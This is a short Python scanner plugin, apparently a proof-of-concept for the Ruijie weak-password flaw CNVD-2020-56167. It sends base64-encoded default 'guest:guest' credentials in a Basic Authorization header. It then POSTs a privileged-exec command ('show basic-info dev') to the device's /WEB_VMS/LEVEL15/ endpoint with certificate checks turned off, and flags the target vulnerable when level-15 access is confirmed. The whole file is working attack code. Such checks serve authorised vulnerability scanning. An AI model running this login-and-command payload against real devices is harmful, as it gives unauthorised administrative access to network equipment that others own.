#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
import re
def msg():
  ret = {

      'links'     :  '',

      'huixian'   :  '',

      'method'    :   'post',

      'bugname'   :   '锐捷弱口令CNVD-2020-56167',

      'level'     :   'low',

      'FOFA'      :   '',

      'author'    :   'ppxfx',

      'ifbug'     :   False,

      'create_time':  '2024/3/4',
  }
  return ret
def run(url,ua):
  ret = msg()
  headers = {
      'User-Agent': ua,
      'Authorization': 'Basic Z3Vlc3Q6Z3Vlc3Q=',
      }
  target = '/WEB_VMS/LEVEL15/'
  data = 'command=show basic-info dev&strurl=exec%04&mode=%02PRIV_EXEC&signname=Red-Giant.'
  url1 = url + target
  ret['url'] = url1
  try:
    res=requests.post(url=url1,headers=headers,data=data,timeout=5,verify=False)
    if res.status_code == 200 and "Level was: LEVEL15" in res.text and "/WEB_VMS/LEVEL15/" in res.text:
      # ret['huixian'] = res.text
      res.close()
      ret['ifbug'] = True
      return ret
    else:
      return ret
  except:
    return ret